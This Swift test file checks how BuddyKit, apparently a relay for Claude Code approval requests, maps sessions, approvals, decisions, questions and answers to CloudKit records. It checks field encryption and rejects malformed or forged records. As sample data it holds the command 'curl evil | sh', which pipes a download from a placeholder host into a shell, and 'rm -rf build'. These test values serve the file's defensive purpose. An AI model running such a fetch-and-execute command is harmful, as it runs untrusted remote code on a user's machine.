import BuddyKit
import CloudKit
import Foundation
import Testing

// No test here touches CloudKit: `CKRecord(recordType:recordID:)` and `encryptedValues` work without a container.

private let zone = CloudKitSchema.zoneID
private let t0 = Date(timeIntervalSince1970: 1_800_000_000)

/// The keys readable through plain subscripting. (`allKeys()` also lists encrypted keys, whose values
/// only `encryptedValues` returns.)
private func plainKeys(_ record: CKRecord) -> Set<String> {
    Set(record.allKeys().filter { record[$0] != nil })
}

private func session(tool: String? = "Bash") -> SessionRecord {
    SessionRecord(sessionId: "sess-1", state: .waiting, project: "buddy-example", lastTool: tool, updatedAt: t0)
}

private func approval(
    summary: String = "rm -rf build", truncated: Bool = false, status: ApprovalStatus = .pending
) -> ApprovalRecord {
    ApprovalRecord(
        requestId: UUID(), sessionId: "sess-1", status: status, tool: "Bash", summary: summary,
        isTruncated: truncated, createdAt: t0, expiresAt: t0.addingTimeInterval(110))
}

private func approvalFor(_ id: UUID) -> ApprovalRecord {
    ApprovalRecord(
        requestId: id, sessionId: "sess-1", status: .pending, tool: "Bash", summary: "ls", isTruncated: false,
        createdAt: t0, expiresAt: t0.addingTimeInterval(110))
}

private func decision(_ d: Decision = .allow, source: DecisionSource = .phone) -> DecisionRecord {
    DecisionRecord(requestId: UUID(), decision: d, decidedAt: t0.addingTimeInterval(5), source: source)
}

private func question(status: ApprovalStatus = .pending) -> QuestionRecord {
    QuestionRecord(
        requestId: UUID(), sessionId: "sess-1", status: status,
        questions: [
            AskQuestion(
                text: "Which database should we use?", header: "Database",
                options: [
                    AskOption(label: "Postgres", description: "Relational"),
                    AskOption(label: "SQLite", description: nil),
                ],
                multiSelect: false),
            AskQuestion(
                text: "Which features? \u{1F600} 世界", header: "Features",
                options: [AskOption(label: "A", description: nil), AskOption(label: "B", description: "bee")],
                multiSelect: true),
        ],
        createdAt: t0, expiresAt: t0.addingTimeInterval(120))
}

private func answer(_ responses: [[String]] = [["Postgres"], ["A", "B"]]) -> AnswerRecord {
    AnswerRecord(requestId: UUID(), responses: responses, answeredAt: t0.addingTimeInterval(5))
}

@Suite struct CloudKitMappingTests {
    // MARK: Round trips

    @Test func sessionRecordRoundTrips() throws {
        for value in [session(), session(tool: nil)] {
            let record = CKRecord(from: value, zoneID: zone)
            #expect(record.recordType == "Session")
            #expect(record.recordID.recordName == "sess-1")
            #expect(record.recordID.zoneID == zone)
            #expect(SessionRecord(from: record) == value)
        }
        for state in [SessionState.idle, .working, .waiting, .finished, .error] {
            var value = session()
            value.state = state
            #expect(SessionRecord(from: CKRecord(from: value, zoneID: zone)) == value)
        }
    }

    @Test func sessionAgentCountRoundTripsAndDefaultsToZero() throws {
        var value = session()
        value.agentCount = 3
        let record = CKRecord(from: value, zoneID: zone)
        #expect(record["agentCount"] as? Int64 == 3)
        #expect(SessionRecord(from: record) == value)
        // A record from a Mac that predates subagents has no count: none running.
        let old = CKRecord(from: session(), zoneID: zone)
        old["agentCount"] = nil
        #expect(SessionRecord(from: old)?.agentCount == 0)
        // Present with the wrong type, or negative: not ours.
        old["agentCount"] = "3" as NSString
        #expect(SessionRecord(from: old) == nil)
        old["agentCount"] = Int64(-1) as NSNumber
        #expect(SessionRecord(from: old) == nil)
    }

    @Test func approvalRecordRoundTrips() throws {
        for status in [ApprovalStatus.pending, .resolved, .expired] {
            for truncated in [false, true] {
                let value = approval(truncated: truncated, status: status)
                let record = CKRecord(from: value, zoneID: zone)
                #expect(record.recordType == "Approval")
                #expect(record.recordID.recordName == value.requestId.uuidString)
                #expect(record.recordID.zoneID == zone)
                #expect(ApprovalRecord(from: record) == value)
            }
        }
    }

    @Test func decisionRecordRoundTrips() throws {
        for d in [Decision.allow, .deny] {
            let value = decision(d)
            let record = CKRecord(from: value, zoneID: zone)
            #expect(record.recordType == "Decision")
            // Not the bare request id: the request's Approval already has that record name.
            #expect(record.recordID.recordName == "decision-\(value.requestId.uuidString)")
            #expect(record.recordID.recordName != CKRecord(from: approvalFor(value.requestId), zoneID: zone).recordID.recordName)
            #expect(DecisionRecord(from: record) == value)
        }
    }

    @Test func questionRecordRoundTrips() {
        for status in [ApprovalStatus.pending, .resolved, .expired] {
            let value = question(status: status)
            let record = CKRecord(from: value, zoneID: zone)
            #expect(record.recordType == "Question")
            #expect(record.recordID.recordName == value.requestId.uuidString)
            #expect(record.recordID.zoneID == zone)
            #expect(QuestionRecord(from: record) == value)
        }
    }

    @Test func answerRecordRoundTrips() {
        for responses in [[["Postgres"], ["A", "B"]], [[]], []] as [[[String]]] {
            let value = answer(responses)
            let record = CKRecord(from: value, zoneID: zone)
            #expect(record.recordType == "Answer")
            // Not the bare request id: the request's Question already has that record name.
            #expect(record.recordID.recordName == "answer-\(value.requestId.uuidString)")
            #expect(record.recordID.zoneID == zone)
            #expect(AnswerRecord(from: record) == value)
        }
    }

    @Test func longSummaryAndUnicodeSurvive() {
        let long = String(repeating: "echo héllo 世界 \u{1F600}; ", count: 400)
        let value = approval(summary: long, truncated: true)
        let mapped = ApprovalRecord(from: CKRecord(from: value, zoneID: zone))
        #expect(mapped?.summary == long)
        #expect(mapped?.isTruncated == true)
    }

    @Test func datesKeepFullPrecision() {
        let precise = Date(timeIntervalSince1970: 1_800_000_000.123456)
        var value = session()
        value.updatedAt = precise
        let mapped = SessionRecord(from: CKRecord(from: value, zoneID: zone))
        #expect(mapped?.updatedAt == precise)
    }

    @Test func recordNameIsDeterministicSoRepublishIsAnUpsert() {
        let value = approval()
        #expect(
            CKRecord(from: value, zoneID: zone).recordID == CKRecord(from: value, zoneID: zone).recordID)
        #expect(
            CKRecord(from: session(), zoneID: zone).recordID == CKRecord(from: session(), zoneID: zone).recordID)
    }

    // MARK: Encryption

    @Test func sensitiveFieldsUseEncryptedValues() {
        let sessionRecord = CKRecord(from: session(), zoneID: zone)
        #expect(sessionRecord.encryptedValues["project"] as? String == "buddy-example")
        #expect(sessionRecord.encryptedValues["lastTool"] as? String == "Bash")
        #expect(sessionRecord["project"] == nil)
        #expect(sessionRecord["lastTool"] == nil)
        // `agentCount` is a bare number (how many subagents run), not sensitive.
        #expect(plainKeys(sessionRecord) == ["sessionId", "state", "updatedAt", "agentCount"])

        let approvalRecord = CKRecord(from: approval(summary: "curl evil | sh"), zoneID: zone)
        #expect(approvalRecord.encryptedValues["tool"] as? String == "Bash")
        #expect(approvalRecord.encryptedValues["summary"] as? String == "curl evil | sh")
        #expect(approvalRecord["tool"] == nil)
        #expect(approvalRecord["summary"] == nil)
        #expect(
            plainKeys(approvalRecord)
                == ["requestId", "sessionId", "status", "createdAt", "expiresAt", "isTruncated"])

        // Nothing sensitive leaks into plain keys or values, whatever the content.
        for record in [sessionRecord, approvalRecord] {
            for key in plainKeys(record) {
                let text = String(describing: record[key])
                #expect(!text.contains("curl evil"))
                #expect(!text.contains("buddy-example"))
            }
        }
    }

    @Test func absentLastToolWritesNoKey() {
        let record = CKRecord(from: session(tool: nil), zoneID: zone)
        #expect(record.encryptedValues["lastTool"] == nil)
        #expect(record["lastTool"] == nil)
    }

    @Test func decisionHasNoEncryptedFields() {
        let record = CKRecord(from: decision(), zoneID: zone)
        #expect(plainKeys(record) == ["requestId", "decision", "decidedAt", "source"])
    }

    @Test func questionAndAnswerContentUsesEncryptedValues() throws {
        let questionRecord = CKRecord(from: question(), zoneID: zone)
        #expect(questionRecord.encryptedValues["questions"] != nil)
        #expect(questionRecord["questions"] == nil)
        #expect(plainKeys(questionRecord) == ["requestId", "sessionId", "status", "createdAt", "expiresAt"])

        let answerRecord = CKRecord(from: answer([["secret label"]]), zoneID: zone)
        #expect(answerRecord.encryptedValues["responses"] != nil)
        #expect(answerRecord["responses"] == nil)
        #expect(plainKeys(answerRecord) == ["requestId", "answeredAt"])

        // Nothing from the content leaks into plain keys or values.
        for record in [questionRecord, answerRecord] {
            for key in plainKeys(record) {
                let text = String(describing: record[key])
                #expect(!text.contains("database"))
                #expect(!text.contains("secret label"))
            }
        }
    }

    @Test func plainValueInPlaceOfEncryptedQuestionOrAnswerFieldIsRejected() throws {
        let value = question()
        let plainQuestion = CKRecord(
            recordType: "Question", recordID: CKRecord.ID(recordName: value.requestId.uuidString, zoneID: zone))
        plainQuestion["requestId"] = value.requestId.uuidString
        plainQuestion["sessionId"] = "sess-1"
        plainQuestion["status"] = "pending"
        plainQuestion["createdAt"] = t0
        plainQuestion["expiresAt"] = t0
        plainQuestion["questions"] = String(decoding: try JSONEncoder().encode(value.questions), as: UTF8.self)
        #expect(QuestionRecord(from: plainQuestion) == nil)

        let reply = answer()
        let plainAnswer = CKRecord(
            recordType: "Answer", recordID: CKRecord.ID(recordName: "answer-\(reply.requestId.uuidString)", zoneID: zone))
        plainAnswer["requestId"] = reply.requestId.uuidString
        plainAnswer["answeredAt"] = t0
        plainAnswer["responses"] = "[[\"Postgres\"]]"
        #expect(AnswerRecord(from: plainAnswer) == nil)
    }

    @Test func plainValueInPlaceOfEncryptedFieldIsRejected() {
        // A record carrying the sensitive field as a plain key (not through encryptedValues) is not ours.
        let record = CKRecord(recordType: "Session", recordID: CKRecord.ID(recordName: "s", zoneID: zone))
        record["sessionId"] = "s"
        record["state"] = "idle"
        record["updatedAt"] = t0
        record["project"] = "plain"
        #expect(SessionRecord(from: record) == nil)
    }

    // MARK: Malformed input from CloudKit (the phone's records are untrusted) => nil, never a crash

    private func validSession() -> CKRecord { CKRecord(from: session(), zoneID: zone) }
    private func validApproval() -> CKRecord { CKRecord(from: approval(), zoneID: zone) }
    private func validDecision() -> CKRecord { CKRecord(from: decision(), zoneID: zone) }

    @Test func missingFieldsAreRejected() {
        for key in ["sessionId", "state", "updatedAt"] {
            let record = validSession()
            record[key] = nil
            #expect(SessionRecord(from: record) == nil, "Session without \(key)")
        }
        let noProject = validSession()
        noProject.encryptedValues["project"] = nil
        #expect(SessionRecord(from: noProject) == nil)

        for key in ["requestId", "sessionId", "status", "createdAt", "expiresAt", "isTruncated"] {
            let record = validApproval()
            record[key] = nil
            #expect(ApprovalRecord(from: record) == nil, "Approval without \(key)")
        }
        for key in ["tool", "summary"] {
            let record = validApproval()
            record.encryptedValues[key] = nil
            #expect(ApprovalRecord(from: record) == nil, "Approval without \(key)")
        }
        for key in ["requestId", "decision", "decidedAt", "source"] {
            let record = validDecision()
            record[key] = nil
            #expect(DecisionRecord(from: record) == nil, "Decision without \(key)")
        }
    }

    @Test func wrongTypedFieldsAreRejected() {
        let a = validSession()
        a["updatedAt"] = "yesterday"
        #expect(SessionRecord(from: a) == nil)
        let b = validSession()
        b["state"] = 3
        #expect(SessionRecord(from: b) == nil)
        let c = validSession()
        c.encryptedValues["project"] = 42
        #expect(SessionRecord(from: c) == nil)
        let optional = validSession()
        optional.encryptedValues["lastTool"] = 42
        #expect(SessionRecord(from: optional) == nil)

        let d = validApproval()
        d["isTruncated"] = "yes"
        #expect(ApprovalRecord(from: d) == nil)
        let e = validApproval()
        e["isTruncated"] = 7
        #expect(ApprovalRecord(from: e) == nil)
        let f = validApproval()
        f["createdAt"] = 1_800_000_000
        #expect(ApprovalRecord(from: f) == nil)
        let g = validApproval()
        g.encryptedValues["summary"] = Data([1, 2, 3])
        #expect(ApprovalRecord(from: g) == nil)

        let h = validDecision()
        h["decidedAt"] = true
        #expect(DecisionRecord(from: h) == nil)
        let i = validDecision()
        i["requestId"] = 12
        #expect(DecisionRecord(from: i) == nil)
    }

    @Test func unknownEnumRawValuesAreRejected() {
        let a = validSession()
        a["state"] = "exploding"
        #expect(SessionRecord(from: a) == nil)
        let b = validApproval()
        b["status"] = "approved"
        #expect(ApprovalRecord(from: b) == nil)
        let c = validDecision()
        c["decision"] = "always"
        #expect(DecisionRecord(from: c) == nil)
        let d = validDecision()
        d["source"] = "mac-admin"
        #expect(DecisionRecord(from: d) == nil)
        let e = validDecision()
        e["decision"] = "ALLOW"  // exact raw values only
        #expect(DecisionRecord(from: e) == nil)
    }

    @Test func badIdentifiersAreRejected() {
        let notUUID = validApproval()
        notUUID["requestId"] = "not-a-uuid"
        #expect(ApprovalRecord(from: notUUID) == nil)

        // The record name must be the id the record claims: a forged name cannot shadow another request.
        let value = decision()
        let forged = CKRecord(
            recordType: "Decision", recordID: CKRecord.ID(recordName: UUID().uuidString, zoneID: zone))
        forged["requestId"] = value.requestId.uuidString
        forged["decision"] = "allow"
        forged["decidedAt"] = value.decidedAt
        forged["source"] = "phone"
        #expect(DecisionRecord(from: forged) == nil)

        // The bare request id is the Approval's record name, not a Decision's.
        let bare = CKRecord(
            recordType: "Decision", recordID: CKRecord.ID(recordName: value.requestId.uuidString, zoneID: zone))
        bare["requestId"] = value.requestId.uuidString
        bare["decision"] = "allow"
        bare["decidedAt"] = value.decidedAt
        bare["source"] = "phone"
        #expect(DecisionRecord(from: bare) == nil)

        let mismatchedSession = validSession()
        mismatchedSession["sessionId"] = "other-session"
        #expect(SessionRecord(from: mismatchedSession) == nil)
    }

    @Test func wrongRecordTypeIsRejected() {
        #expect(SessionRecord(from: validApproval()) == nil)
        #expect(ApprovalRecord(from: validDecision()) == nil)
        #expect(DecisionRecord(from: validSession()) == nil)
    }

    @Test func malformedQuestionAndAnswerRecordsAreRejected() {
        let validQuestion = { CKRecord(from: question(), zoneID: zone) }
        let validAnswer = { CKRecord(from: answer(), zoneID: zone) }

        for key in ["requestId", "sessionId", "status", "createdAt", "expiresAt"] {
            let record = validQuestion()
            record[key] = nil
            #expect(QuestionRecord(from: record) == nil, "Question without \(key)")
        }
        let noQuestions = validQuestion()
        noQuestions.encryptedValues["questions"] = nil
        #expect(QuestionRecord(from: noQuestions) == nil)
        for key in ["requestId", "answeredAt"] {
            let record = validAnswer()
            record[key] = nil
            #expect(AnswerRecord(from: record) == nil, "Answer without \(key)")
        }
        let noResponses = validAnswer()
        noResponses.encryptedValues["responses"] = nil
        #expect(AnswerRecord(from: noResponses) == nil)

        // Malformed or wrongly typed JSON payloads.
        for junk in [Data("not json".utf8), Data("{\"a\":1}".utf8), Data("[[1,2]]".utf8), Data()] {
            let q = validQuestion()
            q.encryptedValues["questions"] = junk
            #expect(QuestionRecord(from: q) == nil)
            let a = validAnswer()
            a.encryptedValues["responses"] = junk
            #expect(AnswerRecord(from: a) == nil)
        }
        let wrongShapeQuestions = validQuestion()
        wrongShapeQuestions.encryptedValues["questions"] = Data("[{\"text\":\"x\"}]".utf8)
        #expect(QuestionRecord(from: wrongShapeQuestions) == nil)
        let wrongTypeQuestions = validQuestion()
        wrongTypeQuestions.encryptedValues["questions"] = 42
        #expect(QuestionRecord(from: wrongTypeQuestions) == nil)
        let wrongTypeResponses = validAnswer()
        wrongTypeResponses.encryptedValues["responses"] = 42
        #expect(AnswerRecord(from: wrongTypeResponses) == nil)

        // Wrong field types and unknown enum values.
        let badStatus = validQuestion()
        badStatus["status"] = "approved"
        #expect(QuestionRecord(from: badStatus) == nil)
        let badDate = validAnswer()
        badDate["answeredAt"] = "yesterday"
        #expect(AnswerRecord(from: badDate) == nil)
        let badId = validQuestion()
        badId["requestId"] = "not-a-uuid"
        #expect(QuestionRecord(from: badId) == nil)

        // The record name must be the one derived from the claimed request id.
        let value = answer()
        let forged = CKRecord(
            recordType: "Answer", recordID: CKRecord.ID(recordName: UUID().uuidString, zoneID: zone))
        forged["requestId"] = value.requestId.uuidString
        forged["answeredAt"] = t0
        forged.encryptedValues["responses"] = Data("[[\"Postgres\"]]".utf8)
        #expect(AnswerRecord(from: forged) == nil)
        let bare = CKRecord(
            recordType: "Answer", recordID: CKRecord.ID(recordName: value.requestId.uuidString, zoneID: zone))
        bare["requestId"] = value.requestId.uuidString
        bare["answeredAt"] = t0
        bare.encryptedValues["responses"] = Data("[[\"Postgres\"]]".utf8)
        #expect(AnswerRecord(from: bare) == nil)
    }

    @Test func questionAndAnswerWrongRecordTypeIsRejected() {
        let q = CKRecord(from: question(), zoneID: zone)
        let a = CKRecord(from: answer(), zoneID: zone)
        #expect(QuestionRecord(from: a) == nil)
        #expect(AnswerRecord(from: q) == nil)
        #expect(QuestionRecord(from: CKRecord(from: approval(), zoneID: zone)) == nil)
        #expect(AnswerRecord(from: CKRecord(from: decision(), zoneID: zone)) == nil)
        #expect(ApprovalRecord(from: q) == nil)
        #expect(DecisionRecord(from: a) == nil)
    }

    @Test func decisionSourceIsCarriedButNotTrusted() {
        // `source` is whatever the writer said; the Mac records every phone decision as `.phone` itself.
        let claimed = decision(.allow, source: .mac)
        #expect(DecisionRecord(from: CKRecord(from: claimed, zoneID: zone))?.source == .mac)
    }
}

@Suite struct CloudKitSchemaTests {
    @Test func constantsMatchTheSpec() {
        #expect(CloudKitSchema.containerIdentifier == "iCloud.com.sergeyhovakimyan.buddy")
        #expect(CloudKitSchema.zoneName == "Buddy")
        #expect(CloudKitSchema.zoneID.zoneName == "Buddy")
        #expect(CloudKitSchema.zoneID.ownerName == CKCurrentUserDefaultName)
    }

    @Test func approvalSubscriptionAlertsWithoutLeakingContent() {
        let subscription = CloudKitSchema.approvalSubscription()
        #expect(subscription.subscriptionID == CloudKitSchema.approvalSubscriptionID)
        #expect(subscription.recordType == "Approval")
        #expect(subscription.querySubscriptionOptions == .firesOnRecordCreation)
        #expect(subscription.zoneID == CloudKitSchema.zoneID)
        let info = subscription.notificationInfo
        #expect(info?.category == "BUDDY_APPROVAL")
        #expect(info?.alertBody == "Claude Code needs approval")
        #expect(info?.desiredKeys == nil)
        #expect(info?.alertLocalizationArgs == nil)
        #expect(info?.shouldSendContentAvailable != true)
    }

    @Test func decisionSubscriptionIsSilent() {
        let subscription = CloudKitSchema.decisionSubscription()
        #expect(subscription.subscriptionID == CloudKitSchema.decisionSubscriptionID)
        #expect(subscription.recordType == "Decision")
        #expect(subscription.querySubscriptionOptions == .firesOnRecordCreation)
        #expect(subscription.zoneID == CloudKitSchema.zoneID)
        let info = subscription.notificationInfo
        #expect(info?.shouldSendContentAvailable == true)
        #expect(info?.alertBody == nil)
        #expect(info?.soundName == nil)
        #expect(info?.shouldBadge != true)
        #expect(info?.desiredKeys == nil)
    }

    @Test func questionSubscriptionAlertsWithoutLeakingContent() {
        let subscription = CloudKitSchema.questionSubscription()
        #expect(subscription.subscriptionID == "buddy.question.created")
        #expect(subscription.recordType == "Question")
        #expect(subscription.querySubscriptionOptions == .firesOnRecordCreation)
        #expect(subscription.zoneID == CloudKitSchema.zoneID)
        let info = subscription.notificationInfo
        #expect(info?.category == "BUDDY_QUESTION")
        #expect(info?.alertBody == "Claude is asking")
        #expect(info?.desiredKeys == nil)
        #expect(info?.alertLocalizationArgs == nil)
        #expect(info?.shouldSendContentAvailable != true)
    }

    @Test func answerSubscriptionIsSilent() {
        let subscription = CloudKitSchema.answerSubscription()
        #expect(subscription.subscriptionID == "buddy.answer.created")
        #expect(subscription.recordType == "Answer")
        #expect(subscription.querySubscriptionOptions == .firesOnRecordCreation)
        #expect(subscription.zoneID == CloudKitSchema.zoneID)
        let info = subscription.notificationInfo
        #expect(info?.shouldSendContentAvailable == true)
        #expect(info?.alertBody == nil)
        #expect(info?.soundName == nil)
        #expect(info?.shouldBadge != true)
        #expect(info?.desiredKeys == nil)
    }

    @Test func subscriptionIdsAreFixedAndDistinct() {
        let ids = [
            CloudKitSchema.approvalSubscriptionID, CloudKitSchema.decisionSubscriptionID,
            CloudKitSchema.questionSubscriptionID, CloudKitSchema.answerSubscriptionID,
        ]
        #expect(Set(ids).count == 4)
        #expect(CloudKitSchema.approvalSubscriptionID != CloudKitSchema.decisionSubscriptionID)
        #expect(CloudKitSchema.approvalSubscription().subscriptionID == CloudKitSchema.approvalSubscription().subscriptionID)
    }
}
